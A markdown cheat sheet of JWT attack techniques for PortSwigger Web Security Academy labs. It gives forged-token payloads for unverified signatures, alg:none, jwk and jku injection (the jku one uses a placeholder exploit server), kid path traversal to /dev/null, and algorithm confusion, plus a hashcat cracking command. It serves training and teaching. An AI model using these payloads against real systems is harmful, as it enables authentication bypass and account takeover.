# 🔑 JWT Attacks Cheatsheet

Complete exploitation methodologies, attack vectors, and payload structures for JWT vulnerabilities in PortSwigger Web Security Academy.

> **💡 Pro Tip:** Highly recommend using the **JWT Editor** extension in Burp Suite. It greatly simplifies the process by allowing you to switch algorithms (`alg: none`), automatically generate and inject keys (`JWK`, `JKU`), and sign fuzzing payloads on the fly with just a few clicks.

---

## 📌 Methodology & Testing Workflow

1. **Identify JWTs:** Look for tokens in `Authorization: Bearer <token>` headers, session cookies, or POST bodies (`eyJ...`).
2. **Decode Token:** Split into Header, Payload, Signature using Burp JWT Editor extension or base64 decoding.
3. **Check Signature Verification:** Test if the backend verifies signatures at all or checks the `alg` header.
4. **Inject Headers:** Test `jwk`, `jku`, and `kid` parameter manipulations.
5. **Algorithm Confusion:** Force RS256/ES256 (Asymmetric) to HS256 (Symmetric) if public keys/certs are exposed.

## 🛠️ Detailed Breakdown & Attack Vectors

### 1. Unverified Signature & Algorithm Attacks

#### JWT Authentication Bypass via Unverified Signature
The server decodes the token and trusts claims without checking the signature integrity.

* **Exploit:** Modify payload (`"sub": "administrator"`) and leave the original signature intact or remove it completely.

<pre><code>HEADER: {"alg": "RS256", "typ": "JWT"}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [Keep original or leave blank]</code></pre>

---

#### JWT Authentication Bypass via Flawed Signature Verification (alg: none)
The server accepts tokens signed with `alg: none` or case variations (`None`, `NONE`).

* **Exploit:** Change `alg` to `none`, modify the payload, and strip the signature bytes (keep trailing dot).

<pre><code>HEADER: {"alg": "none", "typ": "JWT"}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [empty - keep trailing dot: eyJ...eyJ....]</code></pre>

---

#### JWT Authentication Bypass via Weak Signing Key
Brute-force secret key using `hashcat` or `john` when HMAC (`HS256`) is used.

* **Crack Secret with Hashcat:**
<pre><code>hashcat -a 0 -m 16500 eyJraWQiOiIzNWQyOGYyZS1iMDNlLTQ1MjEtYWFjZS01NzAxNzJjNjFjOTEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NTc0MjEyNSwic3ViIjoid2llbmVyIn0.xxl96KcwlpJrj9nmQZjQwSoSJ43uNAPOEtDAC4blGMM hashwordlist.txt</code></pre>

* **Exploit:** Create Symmetric key and insert base64 encoded `secret` in new Symmetric Key. Sign modified payload (`"sub": "administrator"`) using cracked secret (`secret`).

### 2. Header Injection Attacks

#### JWT Authentication Bypass via JWK Header Injection
Inject an embedded public key (`jwk`) directly inside the JWT header. If the server trusts the embedded key to verify the signature, the attack succeeds.

<pre><code>HEADER:
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "YOUR-PUBLIC-KEY-MODULUS..."
  }
}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [Signed with YOUR private key]</code></pre>

---

#### JWT Authentication Bypass via JKU Header Injection
The server fetches the verification key from a URL specified in the `jku` (JWK Set URL) header.

* **Exploit:** Host custom `jwks.json` on exploit server and point `jku` to it.

<pre><code>HEADER:
{
  "alg": "RS256",
  "jku": "https://YOUR-EXPLOIT-SERVER.net/jwks.json"
}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [Signed with YOUR private key]</code></pre>

---

#### JWT Authentication Bypass via KID Header Path Traversal
The `kid` (Key ID) header specifies which key file on disk to use. Point it to a predictable file (e.g., `/dev/null` or symmetric key file) via Path Traversal.

* **Exploit:** Direct `kid` to `/dev/null` and sign the token using an empty secret (`\x00` or empty string in HS256).

<pre><code>HEADER:
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [HMAC-SHA256 with empty key ""]</code></pre>

---

### 3. Algorithm Confusion Attacks

#### Algorithm Confusion (RS256 -> HS256) with Exposed Public Key
Server uses RS256 (asymmetric) normally, but accepts HS256 (symmetric). If you obtain the server's public key (e.g., `/jwks.json` or `/jwk.key`), sign the token with HS256 using the public key string as the secret key.

1. Obtain public key in PEM format (`/jwks.json` or cert endpoint).
2. Convert key to canonical PEM/DER format if needed.
3. Sign token using **HS256** using the **Public Key** as secret string.

<pre><code>HEADER: {"alg": "HS256", "typ": "JWT"}
PAYLOAD: {"sub": "administrator"}
SIGNATURE: [HMAC-SHA256 signed using public_key.pem as secret]</code></pre>

---

#### Algorithm Confusion with No Exposed Key
When the public key is not directly exposed, extract it by deriving it from two distinct valid JWT signatures generated by the application (using `jwt_forging.py` or Burp JWT Editor).

1. Collect 2 valid JWT tokens from target app.
2. Calculate candidate public keys from signature pairs.
3. Convert derived public key to PEM format.
4. Resign forged token using **HS256** with derived public key.

## 🗄️ JWT Attacks Quick Reference

| Attack Vector | Vulnerability Primitive | Exploit Mechanism | Key Payload Modifier |
| :--- | :--- | :--- | :--- |
| **Unverified Signature** | Missing signature validation | Modify payload claims directly | Keep/ignore signature |
| **alg: none** | Insecure algorithm acceptance | Set `"alg": "none"` | Strip signature bytes |
| **Weak Secret** | Predictable HMAC key | Brute-force secret with `hashcat` | Re-sign with cracked secret |
| **JWK Injection** | Embedded key trust | Inject custom public key in `jwk` | Custom RSA key pair |
| **JKU Injection** | Remote JWKS trust | Point `jku` to attacker server | External `jwks.json` URL |
| **KID Traversal** | Arbitrary key file reading | Directory traversal to `/dev/null` | `"kid": "../../dev/null"` + empty secret |
| **Algorithm Confusion** | Asymmetric to Symmetric flaw | Force RS256 -> HS256 | Sign HS256 with Public Key |
